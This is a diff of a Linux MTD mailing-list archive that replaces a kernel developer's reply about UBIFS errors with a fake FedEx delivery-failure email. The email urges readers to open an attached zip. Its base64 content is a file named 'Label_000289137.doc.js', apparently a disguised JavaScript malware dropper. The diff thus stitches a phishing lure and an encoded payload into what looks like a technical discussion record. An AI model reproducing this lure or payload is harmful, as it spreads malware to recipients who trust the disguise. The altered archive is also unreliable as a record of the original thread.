@@ -1,19 +1,18 @@
-Received: from mail-vn0-x232.google.com ([2607:f8b0:400c:c0f::232])
+Received: from p3nlsmtp13.shr.prod.phx3.secureserver.net ([72.167.234.238])
  by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1Z6Div-0003I7-0r
- for linux-mtd@lists.infradead.org; Sat, 20 Jun 2015 08:01:57 +0000
-Received: by vnbf7 with SMTP id f7so941590vnb.6
- for <linux-mtd@lists.infradead.org>; Sat, 20 Jun 2015 01:01:34 -0700 (PDT)
+ id 1Z6HHF-00027r-0C
+ for linux-mtd@lists.infradead.org; Sat, 20 Jun 2015 11:49:37 +0000
+Subject: Problem with parcel shipping, ID:000289137
+To: linux-mtd@lists.infradead.org
+Date: Sat, 20 Jun 2015 04:49:11 -0700
+From: "FedEx International Ground"
+ <cecil.franklin@p3nw8sh224.shr.prod.phx3.secureserver.net>
+Reply-To: "FedEx International Ground"
+ <cecil.franklin@p3nw8sh224.shr.prod.phx3.secureserver.net>
+Message-ID: <fac472526d51c3d367757696459c30f2@p3nw8sh224.shr.prod.phx3.secureserver.net>
 MIME-Version: 1.0
-In-Reply-To: <CAC7eWMWXxbSL+WG_vHFg-DtApitTHx+-A5aarfcNeAJSWY+kJg@mail.gmail.com>
-References: <CAC7eWMWXxbSL+WG_vHFg-DtApitTHx+-A5aarfcNeAJSWY+kJg@mail.gmail.com>
-Date: Sat, 20 Jun 2015 10:01:33 +0200
-Message-ID: <CAFLxGvy7cmbDR3zo2H-sbBuJx1W4jN+4U_CZAgHonnEq7cMHDg@mail.gmail.com>
-Subject: Re: Two ubifs errors
-From: Richard Weinberger <richard.weinberger@gmail.com>
-To: Smitha Rathnam <rathnam.smitha@gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Cc: "linux-mtd@lists.infradead.org" <linux-mtd@lists.infradead.org>
+Content-Type: multipart/mixed; boundary="b1_28af5b3936549f0a67623f8328a4b0fb"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -23,49 +22,56 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-On Sat, Jun 20, 2015 at 12:50 AM, Smitha Rathnam
-<rathnam.smitha@gmail.com> wrote:
-> Hi All,
->
-> I posted a similar problem earlier. This time my question is slightly different.
-> First: We have a system that uses the linux 2.6 kernel, ubifs. We use
-> a micron nand device.
-> The system uses two partitions, one for the ubi rootfs and the other
-> for the ubi logfs.
-> We found that in the last few months, the system has been failing on
-> the logfs. And we lose data. The error seen is "UBIFS error. LEB xx
-> scanning failed."
->
-> We got around this error by reinstalling (which essentially formats
-> the partitions) software. But we lost the data.
->
-> Second: The question was how to reproduce the issue. After looking
-> through forums, I found that it is mostly related to losing power when
-> writing to the nand.
-> So we setup a test station with three systems running the same
-> software version writing lot of data to the nand and continuously
-> powercycling the system. After running the tests for two days, we
-> found one system had broken down after 2000 power cycles. While the
-> others had not. After restarting the test, we found that another
-> system had broken down with the same error after two days but after
-> 300 power cycles. This time it failed while scanning LEB 2733.
->
-> One of the systems shows the bad block error which seems to show up in
-> the ubi rootfs. This does not affect the nand fs.
->
-> My worry and question is: Why are all systems not failing after two
-> days? One system seems to be more succeptible than others. What could
-> be the explanation for that?
-> I have some logs. Please have a look and advise.
+--b1_28af5b3936549f0a67623f8328a4b0fb
+Content-Type: text/plain; charset=us-ascii
 
-Without a detailed analyze of the UBI/FS corruptions you face I can't say much.
-Maybe your MTD driver has issues, maybe you're using a horrible
-screwed vendor kernel...
-  Regarding the powercut tests, please use the UBIFS or UBI powercut emulation,
-it will stop IO at critical points. If you just power cycle your board
-from time to time
-there is a high chance that all IO is done while you cut the power.
+Dear Customer,
 
--- 
-Thanks,
-//richard
+We could not deliver your parcel.
+Please, open email attachment to print shipment label.
+
+Yours faithfully,
+Cecil Franklin,
+Sr. Delivery Agent.
+
+
+--b1_28af5b3936549f0a67623f8328a4b0fb
+Content-Type: application/zip; name="Label_000289137.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Label_000289137.zip
+
+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
+AEQAAACYBgAAAAA=
+
+
+--b1_28af5b3936549f0a67623f8328a4b0fb--
